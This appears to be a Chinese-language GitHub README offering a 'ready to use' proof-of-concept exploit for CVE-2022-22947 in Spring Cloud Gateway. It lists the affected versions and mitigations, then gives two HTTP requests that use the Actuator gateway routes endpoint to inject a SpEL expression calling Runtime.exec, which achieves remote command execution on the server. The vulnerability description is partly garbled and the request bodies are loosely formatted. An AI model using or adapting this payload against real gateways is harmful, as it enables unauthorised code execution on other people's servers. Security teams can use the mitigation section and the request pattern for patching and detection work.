# Spring_CVE_2022_22947
Spring_CVE_2022_22947:Spring Cloud Gateway现高风险漏洞cve,poc漏洞利用,一键利用,开箱即用
![image](https://user-images.githubusercontent.com/53851034/156614534-ec365420-9bca-4236-a10e-98fc7ed71d43.png)

漏洞描述 ：#####
#漏洞
漏洞描述：#####
### Spring Cloud Gateway Spring中API网关攻击。3.1.0及3.0.6版本（包含）之前存在SpEL表达式的插件，当开发者可以利用Actuator API的执行情况下，将是该漏洞的命令选项。
漏洞描述：#####
# 影  响范围 :
## Spring Cloud Gateway以下版本均受影响：

    3.1.0
    3.0.0至3.0.6
    其他老版本 
    
#  缓解方法 ： 
    3.1.x用户应升级到3.1.1+
    3.0.x用户应升级到3.0.7+
    如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用
    如果需要Actuator端点，则应使用Spring Security对其进行保护 

CVE-2022-22946：HTTP2 不安全的 TrustManager :

严重性 ： Medium 


![image-20220303141049270](https://user-images.githubusercontent.com/53851034/156614983-1471d8b7-89b5-4e8d-8d5b-a451089a44e9.png)



###





# ::p oc :


‘’‘POST /actuator/gateway/routes/new_route HTTP/1.1    

   Host: 127.0.0.1:9000

   Connection: close

   Content-Type: application/json

   {

     "predicates": [

        {

         "name": "Path",
 
         "args": {

           "_genkey_0": "/new_route/**"
 
        }

        }

     ],

   "filters": [

     {

      "name": "RewritePath",

      "args": {

       "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"touch/tmp/x\")}",
 
       "_genkey_1": "/${path}"

     }

    }

  ],

 "uri": "https://wya.pl",

 "order": 0

}

POST /actuator/gateway/refresh HTTP/1.1

Host: 127.0.0.1:9000

Content-Type: application/json

Connection: close

Content-Length: 258

{

 "predicate": "Paths: [/new_route], match trailing slash:true",

 "route_id": "new_route",

 "filters": [

   "[[RewritePath#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")} =/${path}], order = 1]"

  ],

 "uri": "https://wya.pl",

 "order": 0

}
